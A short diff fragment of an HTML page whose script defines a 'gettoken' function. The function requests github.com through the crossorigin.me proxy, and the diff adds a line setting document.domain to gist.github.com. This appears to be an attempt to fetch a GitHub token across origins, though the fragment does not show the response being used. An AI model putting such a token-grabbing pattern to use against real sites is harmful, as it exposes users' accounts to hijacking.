@@ -89,6 +89,7 @@ function ()
 <body onload="">
 <div id="content"></div>
 <script language=javascript>
+document.domain = "gist.github.com";
 	 function gettoken(){
  $.ajax({
    url:'https://crossorigin.me/https://github.com',
@@ -113,6 +114,7 @@ function ()
 });
  };
    gettoken();
+	
 </script>
 </body>
 
